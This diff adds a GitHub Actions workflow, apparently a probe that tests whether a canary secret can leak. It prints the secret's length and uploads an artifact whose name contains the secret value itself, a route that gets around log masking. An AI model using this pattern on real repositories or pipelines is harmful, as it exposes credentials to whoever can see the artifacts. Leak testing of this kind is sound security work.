@@ -1,0 +1,17 @@
+name: mq14fork
+on: push
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: test 1109 authority
+        env:
+          MQ_CANARY: ${{ secrets.MQ_CANARY }}
+        run: echo "AUTHORITY-LEN ${#MQ_CANARY}" && echo "probe authority 1109" > /tmp/probe-auth-1109.txt && echo "probe done"
+      - name: test 1 upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: leak-${{ secrets.MQ_CANARY }}-authority
+          path: /tmp/probe-auth-1109.txt
+      - name: test 1 done
+        run: echo "AUTHORITY done"
